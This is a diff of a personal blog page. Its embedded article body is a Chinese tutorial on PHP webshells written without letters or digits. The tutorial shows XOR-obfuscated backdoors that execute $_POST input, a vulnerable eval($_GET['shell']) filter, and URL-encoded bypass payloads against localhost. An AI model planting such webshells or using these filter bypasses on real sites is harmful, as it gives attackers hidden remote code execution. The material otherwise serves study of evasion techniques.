@@ -6,18 +6,18 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="generator" content="han个人博客">
-    <title>webshell - han个人博客</title>
+    <title>不包含字母和数字的webshell - han个人博客</title>
     <meta name="author" content="han">
     
     
     
         <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: 分析 webshell\n\n\n\n\n\n\nwebshell尝试分析如下 webshell\n123456789&lt;?php    @$_++;    $__=(\"#\"^\"|\");     $__.=(\".\"^\"~\");     $__.=(\"/\"^\"`\");     $__.=(\"|\"^\"/\");     $__.=(\"&#123;\"^\"/\");     $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);?&gt;\n\n基础知识在 php 语言中 ^ 代表异或的意思。 php 是弱类型语言，即使用时可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。\n12345&lt;?php\t@$_++;\t$__=(\"#\" ^ \"|\");    echo ($__);?&gt;\n\n\n可以看到输出为 _，原因是 # 的十六进制为 0x23，| 的十六进制为 7C，两者异或的结果为 5F。\n\nASCII 码 5F 对应的就是 _。\n分析代码12345678&lt;?php    function P()&#123;        echo \"Hello World!\";    &#125;    $_++;    $__= \".\" ^ \"~\";    $__();?&gt;\n\n$_++ 即为变量 _ 的自增运算，在 PHP 未定义的自变量默认值为 NULL ，而 NULL==False==0。\n$__=&quot;.&quot; ^ &quot;~&quot; 即把 . 和 ~ 异或的结果赋值给变量 __ ，由第一段程序，我们可以很容易分析得 &quot;.&quot; ^ &quot;~&quot; 的结果为 0x50 ，故 __ 的值为 P。\n$__()变量后面有括号，即调用函数，故会调用函数 P()。\n所以我们可以通过不同符号的异或构造出 $_POST 等字符，从而编写出一个使用数字和字母的 webshell。\n12345678910111213141516171819&lt;?php    @$_++;    $__=(\"#\"^\"|\");\techo($__);\techo \"&lt;br&gt;\";    $__.=(\".\"^\"~\");\techo($__);\techo \"&lt;br&gt;\";    $__.=(\"/\"^\"`\"); \techo($__);\techo \"&lt;br&gt;\";    $__.=(\"|\"^\"/\"); \techo($__);\techo \"&lt;br&gt;\";    $__.=(\"&#123;\"^\"/\"); \techo($__);\techo \"&lt;br&gt;\";    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);?&gt;\n\n\n最后一段代码的结果为 $_POST[0]($_POST[1])。\n上面的代码还可以写在一起\n1234567&lt;?php    @$_++;    $__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"&#123;\"^\"/\"); \techo($__);\techo \"&lt;br&gt;\";    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);?&gt;\n\n除了用字符还可以用 url 编码实现。\n应用12345&lt;?php\tif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123;  \t\teval($_GET['shell']);\t&#125;?&gt;\n\n此时需要我们写一个无字母和数字组成的 shell。\n123456789&lt;?php   \t// $_='assert';    $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); \t// $__='_POST';    $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');    $___=$$__;\t// assert($_POST[_]);    $_($___[_]);?&gt;\n\n1http://127.0.0.1:8000/shell.php?shell=$_=(%27%01%27^%27`%27).(%27%13%27^%27`%27).(%27%13%27^%27`%27).(%27%05%27^%27`%27).(%27%12%27^%27`%27).(%27%14%27^%27`%27);$__=%27_%27.(%27%0D%27^%27]%27).(%27%2F%27^%27`%27).(%27%0E%27^%27]%27).(%27%09%27^%27]%27);$___=$$__;$_($___[_]);\n\n其中 shell=$_=assert，$__=_POST 。\n1http://127.0.0.1:8000/shell.php?shell=$_=assert;$__=_POST;$___=$_POST;assert($_POST[_]);\n\n\n参考文章\n\n一些不包含数字和字母的webshell\n[记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)\n\n","dateCreated":"2019-09-11T22:06:01+08:00","dateModified":"2019-09-12T08:29:03+08:00","datePublished":"2019-09-11T22:06:01+08:00","description":"Abstract: 分析 webshell","headline":"webshell","image":["https://images.unsplash.com/photo-1566136646093-bf14a769d8d4?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=634&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/11/webshell/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/09/11/webshell/","keywords":"二次注入, Access 注入, Mssql 注入","thumbnailUrl":"https://images.unsplash.com/photo-1566136646093-bf14a769d8d4?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=634&q=80"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: 分析 webshell\n\n\n\n\n\n\nwebshell尝试分析如下 webshell\n123456789&lt;?php    @$_++;    $__=(\"#\"^\"|\");     $__.=(\".\"^\"~\");     $__.=(\"/\"^\"`\");     $__.=(\"|\"^\"/\");     $__.=(\"&#123;\"^\"/\");     $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);?&gt;\n\n基础知识在 php 语言中 ^ 代表异或的意思。 php 是弱类型语言，即使用时可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。\n12345&lt;?php\t@$_++;\t$__=(\"#\" ^ \"|\");    echo ($__);?&gt;\n\n\n可以看到输出为 _，原因是 # 的十六进制为 0x23，| 的十六进制为 7C，两者异或的结果为 5F。\n\nASCII 码 5F 对应的就是 _。\n分析代码12345678&lt;?php    function P()&#123;        echo \"Hello World!\";    &#125;    $_++;    $__= \".\" ^ \"~\";    $__();?&gt;\n\n$_++ 即为变量 _ 的自增运算，在 PHP 未定义的自变量默认值为 NULL ，而 NULL==False==0。\n$__=&quot;.&quot; ^ &quot;~&quot; 即把 . 和 ~ 异或的结果赋值给变量 __ ，由第一段程序，我们可以很容易分析得 &quot;.&quot; ^ &quot;~&quot; 的结果为 0x50 ，故 __ 的值为 P。\n$__()变量后面有括号，即调用函数，故会调用函数 P()。\n所以我们可以通过不同符号的异或构造出 $_POST 等字符，从而编写出一个使用数字和字母的 webshell。\n12345678910111213141516171819&lt;?php    @$_++;    $__=(\"#\"^\"|\");\techo($__);\techo \"&lt;br&gt;\";    $__.=(\".\"^\"~\");\techo($__);\techo \"&lt;br&gt;\";    $__.=(\"/\"^\"`\"); \techo($__);\techo \"&lt;br&gt;\";    $__.=(\"|\"^\"/\"); \techo($__);\techo \"&lt;br&gt;\";    $__.=(\"&#123;\"^\"/\"); \techo($__);\techo \"&lt;br&gt;\";    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);?&gt;\n\n\n最后一段代码的结果为 $_POST[0]($_POST[1])。\n上面的代码还可以写在一起\n1234567&lt;?php    @$_++;    $__=(\"#\"^\"|\").(\".\"^\"~\").(\"/\"^\"`\").(\"|\"^\"/\").(\"&#123;\"^\"/\"); \techo($__);\techo \"&lt;br&gt;\";    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]);?&gt;\n\n除了用字符还可以用 url 编码实现。\n应用12345&lt;?php\tif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123;  \t\teval($_GET['shell']);\t&#125;?&gt;\n\n此时需要我们写一个无字母和数字组成的 shell。\n123456789&lt;?php   \t// $_='assert';    $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); \t// $__='_POST';    $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');    $___=$$__;\t// assert($_POST[_]);    $_($___[_]);?&gt;\n\n1http://127.0.0.1:8000/shell.php?shell=$_=(%27%01%27^%27`%27).(%27%13%27^%27`%27).(%27%13%27^%27`%27).(%27%05%27^%27`%27).(%27%12%27^%27`%27).(%27%14%27^%27`%27);$__=%27_%27.(%27%0D%27^%27]%27).(%27%2F%27^%27`%27).(%27%0E%27^%27]%27).(%27%09%27^%27]%27);$___=$$__;$_($___[_]);\n\n其中 shell=$_=assert，$__=_POST 。\n1http://127.0.0.1:8000/shell.php?shell=$_=assert;$__=_POST;$___=$_POST;assert($_POST[_]);\n\n\n参考文章\n\n一些不包含数字和字母的webshell\n[记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)\n\n","dateCreated":"2019-09-11T22:06:01+08:00","dateModified":"2019-09-12T09:54:33+08:00","datePublished":"2019-09-11T22:06:01+08:00","description":"Abstract: 分析 webshell","headline":"不包含字母和数字的webshell","image":["https://images.unsplash.com/photo-1566136646093-bf14a769d8d4?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=634&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/11/webshell/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/09/11/webshell/","keywords":"webshell","thumbnailUrl":"https://images.unsplash.com/photo-1566136646093-bf14a769d8d4?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=634&q=80"}</script>
     <meta name="description" content="Abstract: 分析 webshell">
-<meta name="keywords" content="二次注入,Access 注入,Mssql 注入">
+<meta name="keywords" content="webshell">
 <meta property="og:type" content="blog">
-<meta property="og:title" content="webshell">
+<meta property="og:title" content="不包含字母和数字的webshell">
 <meta property="og:url" content="http://yoursite.com/2019/09/11/webshell/index.html">
 <meta property="og:site_name" content="han个人博客">
 <meta property="og:description" content="Abstract: 分析 webshell">
@@ -26,9 +26,9 @@
 <meta property="og:image" content="http://yoursite.com/images/120webshell2.png">
 <meta property="og:image" content="http://yoursite.com/images/120webshell4.png">
 <meta property="og:image" content="http://yoursite.com/images/120webshell5.png">
-<meta property="og:updated_time" content="2019-09-12T00:29:03.560Z">
+<meta property="og:updated_time" content="2019-09-12T01:54:33.764Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="webshell">
+<meta name="twitter:title" content="不包含字母和数字的webshell">
 <meta name="twitter:description" content="Abstract: 分析 webshell">
 <meta name="twitter:image" content="http://yoursite.com/images/120webshell1.png">
     
@@ -266,7 +266,7 @@
         <div class="post-header main-content-wrap text-center">
     
         <h1 class="post-title">
-            webshell
+            不包含字母和数字的webshell
         </h1>
     
     
@@ -349,7 +349,7 @@
             <div class="post-footer-tags">
                 <span class="text-color-light text-small">TAGGED IN</span><br/>
                 
-    <a class="tag tag--primary tag--small t-link" href="/tags/Access-注入/">Access 注入</a> <a class="tag tag--primary tag--small t-link" href="/tags/Mssql-注入/">Mssql 注入</a> <a class="tag tag--primary tag--small t-link" href="/tags/二次注入/">二次注入</a>
+    <a class="tag tag--primary tag--small t-link" href="/tags/webshell/">webshell</a>
 
             </div>
         
